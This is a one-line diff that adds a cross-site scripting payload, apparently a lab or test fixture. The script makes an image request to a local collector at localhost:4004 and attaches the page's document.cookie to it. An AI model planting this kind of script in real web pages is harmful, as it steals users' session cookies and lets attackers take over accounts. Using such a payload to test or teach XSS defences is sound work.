@@ -1,0 +1,1 @@
+<script>new Image().src="http://localhost:4004/?" + encodeURIComponent(document.cookie);</script>
